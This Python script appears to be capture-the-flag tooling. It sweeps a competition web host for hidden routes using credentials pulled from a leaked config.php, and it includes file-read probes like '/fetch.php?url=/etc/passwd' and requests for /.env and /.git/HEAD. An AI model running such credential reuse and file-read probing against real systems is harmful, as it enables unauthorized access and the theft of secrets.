#!/usr/bin/env python
"""Big path sweep against both vhosts.

:8000 answers every unknown path with the identical `{"error":"route not allowed"}`, which makes
it a pure existence oracle: hit the real route and the response changes. 443 is the same Apache
but serves the repo docroot, so a 200/403/500 there reveals deployed files that were never
committed (config.php is git-ignored but very likely still on disk).

Both are worth sweeping because the mail says the vector store is "served with proper
authentication to our web interface" -- that interface is the thing we still have not found.
"""
import http.client
import re
import threading
from queue import Empty, Queue

CFG = open("files/repo-history/c2/config.php", encoding="utf-8").read()
KEY = re.search(r"INTERNAL_API_KEY',\s*'([^']+)'", CFG).group(1)
USER = re.search(r"MAIL_ADMIN_USER',\s*'([^']+)'", CFG).group(1)
PW = re.search(r"MAIL_ADMIN_PASS',\s*'([^']+)'", CFG).group(1)
HOST = "vec.web.2026.sunshinectf.games"

WORDS = """
embed embeddings embedded embedder vec vector vectors vecnet similarity similar nearest neighbor
knn search query queries retrieve retrieval index indexes collection collections document documents
chunk chunks metadata metadata-where where filter filters db database store store-vec chroma
vectorstore vector-store mailstore mail mails message messages inbox imap smtp webmail mailbox
flag flags secret secrets admin administrator console dashboard panel ui interface api v1 v2
status health ping info debug test internal private external auth login logout session token
jwt key keys credential credentials config settings settings.json openapi swagger docs doc
readme about version metrics stats list dump export import upload download file files serve
static assets public private secure restricted gate gateway ingest push pull reset reindex
rebuild train model models ml ai llm sentence sentence-transformers transformer transformers
text texts corpus documents-search embed-search semantic threat manifold centroid centroids
dimension dimensions dims latent projection project score scoring audit provenance neighbors
"""
EXTRA = ["/index.php", "/api.php", "/app.php", "/main.php", "/vec.php", "/embed.php",
         "/embeddings.php", "/search.php", "/flag.php", "/config.php", "/db.php", "/admin.php",
         "/api/", "/v1/", "/v2/", "/internal/", "/files/", "/src/", "/.env", "/.git/HEAD",
         "/phpinfo.php", "/info.php", "/server-status", "/robots.txt", "/composer.json",
         "/fetch.php?url=http://localhost/files/specs.7z", "/fetch.php?url=/etc/passwd"]

TASKS = []
for w in WORDS.split():
    for p in ("/%s" % w, "/api/%s" % w, "/v1/%s" % w, "/%s.php" % w):
        TASKS.append(p)
TASKS += EXTRA
TASKS = sorted(set(TASKS))

VHOSTS = [("8000-plain", 8000, {}), ("8000-key", 8000, {"X-Api-Key": KEY}),
          ("8000-basic", 8000, {"Authorization": "Basic " +
                                 __import__("base64").b64encode(("%s:%s" % (USER, PW)).encode()).decode()}),
          ("443", 443, {})]

Q = Queue()
for p in TASKS:
    for tag, port, h in VHOSTS:
        Q.put((tag, port, p, h))
print("[*] %d paths x %d vhosts = %d probes" % (len(TASKS), len(VHOSTS), Q.qsize()), flush=True)
seen = {}
lock = threading.Lock()


def probe(tag, port, path, hdr):
    try:
        c = http.client.HTTPSConnection(HOST, port, timeout=20) if port == 443 else \
            http.client.HTTPConnection(HOST, port, timeout=20)
    except Exception:
        c = http.client.HTTPSConnection(HOST, port, timeout=20)
    try:
        c.request("GET", path, headers=dict(hdr))
        r = c.getresponse()
        body = r.read()
        c.close()
        return r.status, body
    except Exception as e:
        return type(e).__name__, b""
    finally:
        try:
            c.close()
        except Exception:
            pass


def work():
    while True:
        try:
            tag, port, path, hdr = Q.get_nowait()
        except Empty:
            return
        st, body = probe(tag, port, path, hdr)
        base = b'{"error":"route not allowed"}'
        if st == 403 and body.startswith(base):
            continue                      # the uniform answer, uninteresting
        if st == 404 and b"404 Forbidden" in body:
            continue                      # apache default 404 page is fine to skip? no- keep
        with lock:
            k = (tag, st, body[:200])
            if k in seen:
                continue
            seen[k] = path
        print("%-11s %-34s %-4s %s" % (tag, path, st, body[:90]), flush=True)


if __name__ == "__main__":
    ts = [threading.Thread(target=work, daemon=True) for _ in range(16)]
    for t in ts:
        t.start()
    for t in ts:
        t.join(900)
    print("[*] %d interesting responses" % len(seen), flush=True)
